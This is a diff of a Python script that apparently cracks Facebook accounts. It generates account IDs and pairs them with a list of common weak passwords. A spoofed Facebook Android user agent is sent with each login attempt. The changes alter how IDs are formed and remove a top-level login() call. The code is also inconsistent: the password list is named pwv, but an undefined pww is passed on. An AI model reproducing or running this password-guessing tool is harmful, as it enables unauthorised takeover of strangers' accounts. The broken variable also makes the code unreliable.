@@ -80,7 +80,7 @@ import requests as r
 def login():
     os.system("clear")
     print("\033[1;37m")
-    uid = kode+kodex+guru+'@gmail.com'
+    uid = kode+kodex+guru
     pwv = [kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+' '+kodex,'bangladesh','@#@#@#','i love you','free fire']
     ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
     check(uid, pww, ua)
@@ -118,8 +118,6 @@ def check(uid, pww, ua):
         print(result)
     except:
         pass
-
-login()
 
 logo = ("""
 \033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
